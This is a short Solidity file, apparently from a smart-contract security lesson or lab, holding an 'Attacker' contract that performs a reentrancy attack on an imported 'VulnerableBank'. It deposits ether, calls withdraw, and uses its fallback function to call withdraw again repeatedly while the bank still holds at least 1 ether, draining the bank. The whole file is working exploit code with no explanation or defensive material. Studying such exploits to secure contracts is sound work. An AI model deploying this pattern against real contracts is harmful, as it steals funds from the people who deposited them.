// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "./VulnerableBank.sol";

contract Attacker {
    VulnerableBank public vulnerableBank;

    constructor(address _vulnerableBank) public {
        vulnerableBank = VulnerableBank(_vulnerableBank);
    }

    function attack() public payable {
        require(msg.value > 0);
        vulnerableBank.deposit.value(msg.value)();
        vulnerableBank.withdraw();
    }

    function () external payable {
        if (address(vulnerableBank).balance >= 1 ether) {
            vulnerableBank.withdraw();
        }
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
